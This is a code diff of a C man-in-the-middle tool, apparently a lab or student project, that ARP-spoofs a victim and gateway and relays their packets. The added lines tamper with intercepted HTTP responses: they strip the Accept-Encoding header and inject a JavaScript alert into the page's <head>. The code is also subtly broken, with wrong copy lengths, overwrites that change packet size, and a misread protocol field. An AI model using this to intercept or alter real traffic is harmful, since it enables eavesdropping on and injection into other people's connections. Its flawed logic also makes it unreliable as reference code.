@@ -65,13 +65,21 @@ void *startF(void *arg) {
         memcpy(pEther->DST_mac, GATEWAY_MAC, 6);
         send_packet(real_arg->handle, real_arg->packet, real_arg->size);
     }
-    else if(!strncmp(pEther->SRC_mac, GATEWAY_MAC, 6) && !strncmp(pIpv4->dest_ip, TARGET_IP, 4)) {
+    else if (!strncmp(pEther->SRC_mac, GATEWAY_MAC, 6) && !strncmp(pIpv4->dest_ip, TARGET_IP, 4)) {
         printf("Get a packet from gateway reply\n");
         printf("Change my mac: ");
         print_mac(pEther->DST_mac);
         printf("to victim's mac: ");
         print_mac(TARGET_MAC);
         memcpy(pEther->DST_mac, TARGET_MAC, 6);
+        if (choose == 2)
+            if (ntohs(pEther->eth_type) == EPT_IPv4 && pIpv4->type_of_service == PROTOCOL_TCP) {
+                char *p = strstr((char *)pTcp->data, "Accept-Encoding");
+                if (p != NULL) memcpy(p,"Accept-Rubbish!", 8);
+                char *q = strstr((char *)pTcp->data, "<head>");
+                char *r = "<head><script type=\"text/javascript\">alert('big brother is watching at you');</script></head>";
+                if (q != NULL) memcpy(q, r, strlen(r));
+            }
         send_packet(real_arg->handle, real_arg->packet, real_arg->size);
     }
 }
@@ -208,7 +216,7 @@ int main(int argc, char const *argv[]) {
     scanf(" %d", &choose);
 
     /* four modes */
-    strcpy(filter_app, "");
+    /*strcpy(filter_app, "");
     pcap_compile(handle, &filter, filter_app, 0, *net);
     pcap_setfilter(handle, &filter);
     while (1) {
@@ -220,7 +228,7 @@ int main(int argc, char const *argv[]) {
             forward_arg.size = pkt_header->caplen;
             pthread_create(&new_thread, NULL, (void *)startF, (void *)&forward_arg);
         }
-    }
+    }*/
 
     /* before end */
     pthread_join(thread2,NULL);
